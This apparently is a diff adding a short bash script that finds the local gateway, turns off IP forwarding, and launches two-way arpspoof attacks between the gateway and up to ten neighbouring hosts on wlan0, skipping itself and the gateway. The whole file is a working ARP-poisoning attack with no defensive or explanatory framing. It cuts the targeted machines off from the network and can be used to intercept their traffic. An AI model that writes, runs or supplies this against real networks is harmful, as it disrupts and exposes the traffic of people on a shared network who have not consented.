@@ -1,0 +1,47 @@
+#!/bin/bash
+
+sudo rm ip
+
+#sudo killall arpspoof
+#sudo bash -c 'echo 0 > /proc/sys/net/ipv4/ip_forward'
+
+# sudo arp-scan --interface=wlan0 --localnet | awk '$2 == "Mac" { print $1 }' > ip
+gateway=`route -n | awk 'FNR == 3 { print $2 }'`
+baseip=`echo $gateway | cut -d"." -f1-3`
+
+echo $gateway >> ip
+/sbin/ifconfig wlan0|grep inet|head -1|sed 's/\:/ /'|awk '{print $3}' >> ip
+
+echo 0 > /proc/sys/net/ipv4/ip_forward
+
+index=0
+while IFS= read -r ipaddr
+		do
+			echo $ipaddr 
+			array[$index]="$ipaddr"
+			index=$(($index+1))
+done < ip 
+
+len=${#array[@]}
+
+function array_func
+{
+	flag="false"
+	for j in `seq 0 $len`; do
+		if [ $1 == "${array[$j]}" ]; then
+			flag="true"
+		fi
+	done
+	echo $flag
+}
+
+for i in `seq 1 10`; do
+	ip="$baseip.$i"
+	fl=$(array_func $ip)
+
+	if [ $fl == "false" ]; then
+			sudo arpspoof -i wlan0 -t $gateway $ip  & >/dev/null
+			sudo arpspoof -i wlan0 -t $ip $gateway  & >/dev/null
+	fi
+	echo $ip"-"$fl
+done
